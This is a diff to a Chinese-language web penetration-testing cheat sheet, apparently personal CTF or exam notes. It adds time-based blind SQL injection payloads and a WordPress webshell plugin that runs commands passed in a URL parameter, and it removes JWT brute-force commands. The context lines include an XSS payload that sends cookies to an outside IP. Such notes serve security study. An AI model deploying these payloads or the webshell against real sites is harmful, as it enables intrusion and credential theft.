@@ -59,6 +59,7 @@ date: 2024-02-07
     ```
 
 ##### SQLi
+* 先確認哪裡是注入點，例如 GET 參數或是在 Burp 看哪裡有 POST
 * Union-Based: 有兩個前提
     * 欄位數量要一致
     * 每一個欄位的 data type 都要和前一個 database 一樣
@@ -113,6 +114,7 @@ date: 2024-02-07
     ' AND IF(1=1, SLEEP(5), 0)-- -
     ' AND IF(SUBSTRING(database(),1,1)='a', SLEEP(5), 0)-- -
     ' AND IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>100, SLEEP(5), 0)-- -
+    ' AND (SELECT 8220 FROM (SELECT(SLEEP(5)))uvWb)-- -
     ```
 * 認證繞過
     ```sql
@@ -288,8 +290,6 @@ fetch(`/getflag\)
     <math><mtext><table><mglyph><style><!--</style><img src=x onerror=document.location=`http://172.21.112.129:8000/?d=${document.domain}&c=${document.cookie}`>
     ```
 
-#### [Command Injection - feifei Cheat Sheet](https://lab.feifei.tw/practice/ci/l1.php)
-
 #### SSTI - [Payload Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/)
 * 先確認是不是真的有這個問題: {% raw %}`{{7*7}}`{% endraw %} → 49
 * 用[tplmap](https://github.com/epinna/tplmap)直接打
@@ -317,6 +317,8 @@ fetch(`/getflag\)
     {% endraw %}
 
 #### Command Injection
+* [feifei Cheat Sheet](https://lab.feifei.tw/practice/ci/l1.php)
+
 找到注入點之後可以用以下 payload 判斷對方使用的是哪一個 shell
 * 如果是 CMD: 會輸出 `CMD`
     ```bash
@@ -600,6 +602,25 @@ $ cp /usr/share/webshells/aspx/cmdasp.aspx . # 也可以直接用現成的 websh
     # 跑 wpscan 找外掛和使用者
     $ wpscan --url http://alvida-eatery.local -e ap,at,u --plugins-detection aggressive # 代表 enum 出 all plugin/all theme/user
     ```
+* 上傳 Webshell-Plugin
+    ```bash
+    $ cat > webshell-plugin.php << 'EOF' 
+    <?php
+    /**
+    * Plugin Name: Webshell Plugin
+    * Version: 1.0
+    * Author: Offsec
+    * Author URI: https://offsec.com
+    * License: GPL2
+    */
+
+    if(isset($_GET['cmd'])) {
+        system($_GET['cmd']);
+    } 
+    ?> 
+    EOF
+    $ zip webshell-plugin.zip webshell-plugin.php
+    ```
 
 ## Tools
 
@@ -612,7 +633,7 @@ $ cp /usr/share/webshells/aspx/cmdasp.aspx . # 也可以直接用現成的 websh
 ||[aadecode](https://cat-in-136.github.io/2010/12/aadecode-decode-encoded-as-aaencode.html)|
 
 * psysh: PHP的互動式shell
-
+* pwsh: Kali 內建的 Powershell
 * wasm → c: [wabt](https://github.com/WebAssembly/wabt)
     ```bash
     # 安裝Cmake，所有過程一定要用WSL
@@ -622,20 +643,8 @@ $ cp /usr/share/webshells/aspx/cmdasp.aspx . # 也可以直接用現成的 websh
     # 按照說明build完後進到./build
     $ ./wasm2c {wasm file path} -o {output c file path}
     ```
-
 * Webhook
     * [Webhook.site](https://webhook.site/)
     * [Beeceptor](https://beeceptor.com/)
     * [Ngrok](https://ngrok.com/)
-
 * [JWT Decoder/Encoder](https://www.jwt.io/)
-
-* 爆破JWT
-    * 利用Hashcat
-        ```bash
-        $ hashcat -a 3 -m 16500 jwt.txt ?a?a?a?a
-        ```
-    * 利用John
-    ```bash
-    $ john jwt.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256  
-    ```
